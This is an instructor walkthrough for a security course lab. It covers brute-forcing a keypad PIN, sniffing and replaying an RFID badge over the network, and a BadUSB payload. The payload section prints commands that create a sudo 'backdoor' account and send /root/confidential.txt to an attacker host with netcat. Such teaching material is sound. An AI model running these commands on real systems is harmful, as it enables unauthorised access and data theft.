# Week 11 Hands-On Lab — Instructor Walkthrough

> Verified against live containers end-to-end, including a from-scratch
> `docker compose up -d`. Do not distribute to students before the end of
> the session.

---

## Setup

```bash
cd labs/week11 && docker compose up -d
docker exec -it week11-attacker bash
```

All three target services are plain Python with no package installs, so
they're ready within a couple of seconds — only `week11-workstation`
needs ~10-20s to `apt-get install netcat-traditional`.

---

## Challenge 1: Keypad Brute Force

```bash
curl -s http://10.10.11.10:8080/maintenance-note
```
**Verified result:** names keys 1, 3, 5 as visibly worn — directly
mirrors Worksheet Task 3's scenario (same three keys, deliberately).

**Keyspace question — answers:** 10,000 combinations (0000–9999) with no
information; with the hint, 3⁴ = **81** combinations (repeats allowed
among the 3 worn digits). The actual PIN (`1531`) uses all three worn
digits with one repeated, so a script that also tries to minimise
further (e.g., assumes each worn digit appears at least once) narrows it
to the 4!/(2!) = 12 arrangements of {1,1,3,5} — worth drawing out on the
board if a student spots it.

**Verified brute-force run** (script in hands-on-lab.md, run as-is):
```
Cracked after 22 tries (0.0s): PIN=1531 -> flag{w11_keypad_worn_keys_cracked}
```

**Lockout demo (optional, instructor-run):** spin up a second keypad
instance with `LOCKOUT_ENABLED=1` and the same PIN, and run the same
brute-force script (or even just 6 manual wrong guesses) against it:
```bash
docker run -d --rm --name keypad-hardened --network week11_week11-net \
  --ip 10.10.11.20 -e KEYPAD_PIN=1531 -e LOCKOUT_ENABLED=1 \
  -v "$(pwd)/sim/keypad_server.py:/app/keypad_server.py:ro" \
  python:3.11-slim python3 /app/keypad_server.py
```
**Verified result:** attempts 1–5 return `ACCESS DENIED`; attempt 6
returns `{"error": "keypad locked - too many failed attempts, try again shortly"}`
— a concrete, visible demonstration that this one mitigation alone (no
PIN change) defeats the brute force. Remove it after the demo:
`docker rm -f keypad-hardened`.

---

## Challenge 2: RFID Clone & Replay

```bash
sudo tcpdump -i eth0 -n -A udp port 9100 -c 1
```
**Verified result:**
```
01:38:37 IP 10.10.11.11.51353 > 255.255.255.255.9100: UDP, length 19
...BADGE:EMP-7741-ACCT
```
**Common snag:** students will try this without `sudo` first and get
`CAP_NET_RAW may be required` even though the compose file grants the
container `NET_RAW` — the capability is on the container, but the
unprivileged `hacker` user inside still needs `sudo` to open a raw
socket. Worth flagging before anyone gets stuck on it.

```bash
echo 'BADGE:EMP-7741-ACCT' | nc.traditional 10.10.11.11 9000
```
**Verified result:**
```
Server Room B door reader. Present badge credential:
ACCESS GRANTED
flag{w11_rfid_sniffed_and_replayed}
```

---

## Challenge 3: BadUSB / Rubber Ducky Payload

Payload file and translation exactly as in hands-on-lab.md.

**Verified `duckify.py` output** for the two-line payload:
```
useradd -m -s /bin/bash backdoor && echo backdoor:BadUSB123 | chpasswd && usermod -aG sudo backdoor
cat /root/confidential.txt | nc.traditional -q1 10.10.11.2 9999
```
(Note each becomes its own line because of the `ENTER` after each
`STRING` — a payload missing an `ENTER` will run straight into the next
line with no separator, which is worth letting a student discover once
rather than pre-warning.)

**Verified injection + exfiltration:**
```
CONFIDENTIAL - Q3 Financials (do not distribute)
Draft figures pending board review.
Recovery flag (do not lose this file): flag{w11_badusb_payload_executed}
```

**Verified backdoor creation:**
```
uid=1000(backdoor) gid=1000(backdoor) groups=1000(backdoor),27(sudo)
```

**Full chain, verified in one sitting with no manual intervention
between steps:** maintenance-note hint → reduced-keyspace brute force →
Flag 1 → tcpdump capture → badge replay → Flag 2 → DuckyScript payload →
duckify.py translation → netcat injection → backdoor account created +
file exfiltrated → Flag 3.

---

## Design Notes (why things are built the way they are)

- **Keypad returns HTTP 200 for both granted and denied, not 403/401.**
  Tried 403 first — it breaks a naive `urllib.request` brute-force loop
  (raises `HTTPError` on any 4xx instead of returning), which is a real
  Python-exception-handling trap, not anything to do with the lesson.
  Switched to always-200-with-a-body so students' first brute-force
  script doesn't die on the very first wrong guess for an unrelated
  reason.
- **RFID "cloning" is modelled as a genuine network capture-and-replay**,
  not a canned "here's the credential" hint. Nothing about the badge ID
  is given to students anywhere in the docs — it has to be sniffed.
- **The BadUSB payload runs against an already-exposed shell, not a
  login prompt.** This is deliberate and matches the real attack: BadUSB
  doesn't bypass authentication, it automates what you'd type once
  you're already physically at an unlocked machine. Framing it as
  "defeating a login" would misteach the actual threat model.
- **`duckify.py` is a real (if minimal) DuckyScript subset**, not a toy
  — `STRING`/`ENTER`/`REM`/`DELAY` are genuine DuckyScript keywords, and
  `STRING` genuinely doesn't auto-press Enter in the real language
  either. A student who later touches an actual Rubber Ducky or Bash
  Bunny will recognise the syntax.

## Common Issues

- **`tcpdump: ... CAP_NET_RAW may be required`:** missing `sudo` — see
  above.
- **`nc: command not found`:** use `nc.traditional`, not bare `nc` — the
  shared Kali image's `nc` may resolve to a netcat variant without `-e`
  support depending on `update-alternatives` state. `nc.traditional` is
  always the right binary for every step in this lab.
- **Workstation container briefly unreachable right after `docker
  compose up -d`:** it's mid-`apt-get install netcat-traditional`.
  Resolves in under 20 seconds.
